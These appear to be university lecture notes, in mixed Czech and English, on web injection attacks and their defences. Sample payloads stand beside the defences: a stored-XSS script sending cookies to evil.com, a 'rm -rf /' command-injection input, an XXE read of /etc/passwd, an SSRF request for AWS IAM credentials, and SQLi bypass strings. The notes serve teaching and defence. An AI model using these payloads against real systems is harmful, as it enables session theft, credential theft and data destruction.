---
title: Injekce — SQL, XSS, CSRF, command
---

# Injekční útoky — SQLi, XSS, CSRF, command injection

**Injection** = útok, kdy attacker *vloží* malicious data, které aplikace *zpracuje jako kód*. Klasická *OWASP Top 10* položka. Manifests in many forms — SQL, command shell, JavaScript, XML, LDAP, atd.

## SQL Injection (SQLi)

Web application uses *string concatenation* k construct SQL queries → user input *staves se* SQL.

### Klasický příklad

```python
# Vulnerable
query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"
cursor.execute(query)
```

Attacker input: `username = "admin'--"`, `password = "anything"`:

```sql
SELECT * FROM users WHERE username='admin'--' AND password='anything'
                                            ^^ comment, rest ignored
```

Authentication bypassed.

Or: `username = "' OR '1'='1' -- "`:

```sql
SELECT * FROM users WHERE username='' OR '1'='1' --' AND password='...'
```

Komentář odstraní `AND password=...` → WHERE je triviálně pravdivá → return *all* users.

### SQLi varianty

- **In-band** — result returned in response (UNION-based, error-based).
- **Inferential / Blind** — no direct result. Infer via boolean response or timing.
- **Out-of-band** — exfiltrate via DNS, HTTP from DB server.

### Famous SQLi

- **TalkTalk 2015** — 4M customers, £77M fine.
- **Heartland Payment Systems 2008** — 130M credit cards.
- **Yahoo 2012** — 450k accounts.

### Defense

#### Parameterized queries (best)

```python
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", 
               (username, password))
```

DB driver *separates* query from data. Attacker input never interpreted as SQL.

::: viz sqli-injection-trace "Napiš username/password (nebo preset bypass / always / unionx). Vidíš concatenated SQL (vulnerable) vs parameterized (safe) — input nikdy nezmění strukturu."
:::

#### ORM (Object-Relational Mapper)

```python
User.objects.filter(username=username, password=password)
```

Django ORM, SQLAlchemy generate parameterized queries automatically.

#### Stored procedures

```sql
EXEC sp_login @username, @password
```

Parameterized at DB level.

#### Input validation

Whitelist (allow only known-good characters). Easier to bypass than parameterized queries.

#### Least privilege

App DB user has minimum perms. Even if SQLi succeeds, attacker limited.

#### WAF (Web Application Firewall)

ModSecurity, Cloudflare WAF detect SQLi patterns. Defense in depth, not primary.

## XSS — Cross-Site Scripting

Attacker injects **JavaScript** into page. Browser executes in context of legitimate site → steal cookies, session, perform actions as user.

### Tři typy

#### Stored XSS

Payload stored in DB. Each visitor executes.

```html
<!-- Forum post -->
Hello! <script>fetch('https://evil.com/?c=' + document.cookie)</script>
```

Every reader sends their cookies to attacker.

#### Reflected XSS

Payload in URL. Victim clicks link → executes on their browser.

```
https://site.com/search?q=<script>alert(1)</script>
```

Phishing email contains link. Victim clicks. JavaScript runs.

#### DOM-based XSS

Pure client-side. JavaScript on page reads attacker-controlled DOM (URL params, document.referrer) → eval/innerHTML it.

```js
document.body.innerHTML = location.hash.substring(1);
// URL: site.com/#<img src=x onerror=alert(1)>
```

### Defense

#### Output encoding (best)

When inserting user input into HTML:

```html
<!-- Wrong: -->
<div>${user_comment}</div>

<!-- Right: -->
<div>&lt;script&gt;alert(1)&lt;/script&gt;</div>
```

Encode `<, >, &, ", '`. Use framework auto-encoding (React, Vue do by default).

#### Content Security Policy (CSP)

HTTP header restricting what scripts run:

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
```

Blocks inline scripts, scripts from other origins. Defense in depth — even if XSS, attacker's script may not execute.

#### HTTPOnly cookies

Cookie flag preventing JavaScript access:

```
Set-Cookie: session=abc; HttpOnly
```

JS can't read cookie via `document.cookie`. Stops cookie theft.

#### Sanitization

For HTML allowed input (rich text editors): use DOMPurify, bleach, OWASP HTML Sanitizer.

```js
const clean = DOMPurify.sanitize(dirty_html);
```

## CSRF — Cross-Site Request Forgery

Attacker tricks victim's browser to *make request* to target site, leveraging victim's existing auth.

### Klasický příklad

User logged into bank. Visits attacker's site:

```html
<img src="https://bank.com/transfer?to=evil&amount=1000">
```

Browser sends image request → includes user's cookies → bank processes transfer.

User didn't intend it. Bank thinks user did.

### Defense

#### CSRF tokens (best)

Server generates random *token* per session. Includes in forms.

```html
<form action="/transfer" method="POST">
    <input type="hidden" name="csrf_token" value="abc123...">
    <input name="amount">
</form>
```

On submit, server verifies `csrf_token` matches session. Attacker can't generate (cross-origin can't read).

#### SameSite cookies

```
Set-Cookie: session=abc; SameSite=Lax
```

Cookie *not* sent on cross-origin requests. Default in modern browsers (since 2020).

Stops most CSRF. *But*: doesn't help if attacker is on *same site* (XSS).

::: viz csrf-samesite "Vyber SameSite (None/Lax/Strict) + toggle CSRF token + typ útoku. Browser pošle (nebo nepošle) cookie automaticky; server pak akceptuje / odmítne."
:::

#### Referer checking

Server checks `Referer` header. If from different origin → reject.

Weak — can be stripped, falsified by referrer policy.

## Command Injection

Application passes user input to *shell command* without sanitization.

```python
os.system("ping -c 1 " + user_input)
```

Attacker: `user_input = "8.8.8.8; rm -rf /"`:

```bash
ping -c 1 8.8.8.8; rm -rf /
```

Two commands execute.

### Defense

#### Avoid shell

```python
subprocess.run(["ping", "-c", "1", user_input], shell=False)
```

`shell=False` + args list → no shell interpretation. Each arg is *one* argument, even with spaces or `;`.

#### Whitelist allowed characters

For IP address: only digits and dots.

#### Use library, not shell

For ping: use Python `ping3` library, not `os.system`.

## LDAP Injection

Similar to SQLi but for LDAP queries:

```python
filter = "(&(uid=" + username + ")(password=" + password + "))"
ldap.search(filter)
```

Attacker: `username = "admin)(&"`:

```
(&(uid=admin)(&)(password=any))
```

Boolean logic broken. Authentication bypass.

### Defense

LDAP escaping (`ldap3` library functions). Whitelist input.

## XML / XXE — XML External Entity

XML parser processes entities:

```xml
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

If parser resolves external entities, returns content of `/etc/passwd`.

### Defense

Disable external entity resolution:

```python
parser = etree.XMLParser(resolve_entities=False)
```

Modern XML libraries default-disable.

## Server-Side Request Forgery (SSRF)

Application makes HTTP requests based on user input. Attacker tricks app to access *internal* resources.

```python
url = request.args['url']
response = requests.get(url)
return response.text
```

Attacker: `url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"`:

App fetches AWS metadata. Returns IAM creds. Attacker hijacks AWS account.

### Defense

- **Whitelist** URLs / hosts.
- **Block** private IPs (10.0.0.0/8, 169.254.0.0/16, 127.0.0.1).
- **DNS rebinding protection**.
- **Network-level** — deny private network from web tier.

## OWASP Top 10 (2021)

| Rank | Category |
| :---: | :--- |
| A01 | Broken Access Control |
| A02 | Cryptographic Failures |
| A03 | **Injection** (incl. SQLi, XSS) |
| A04 | Insecure Design |
| A05 | Security Misconfiguration |
| A06 | Vulnerable Components |
| A07 | Identification and Authentication Failures |
| A08 | Software and Data Integrity Failures |
| A09 | Security Logging and Monitoring Failures |
| A10 | Server-Side Request Forgery (SSRF) |

A03 Injection moved from #1 (2017) to #3 (2021) — better awareness + frameworks. Still pervasive.

---

*Zdroj: BIS přednášky 2025/26, Ing. Martin Očenáš, FIT VUT v Brně. Externí reference: OWASP Top 10:2021 ([owasp.org/Top10](https://owasp.org/Top10/)); OWASP Testing Guide; Spett, K.: „SQL Injection: Are Your Web Applications Vulnerable?" (SPI Dynamics, 2002); Stuttard, D., Pinto, M.: „The Web Application Hacker's Handbook" (2nd ed., Wiley 2011); [PortSwigger Web Security Academy](https://portswigger.net/web-security).*
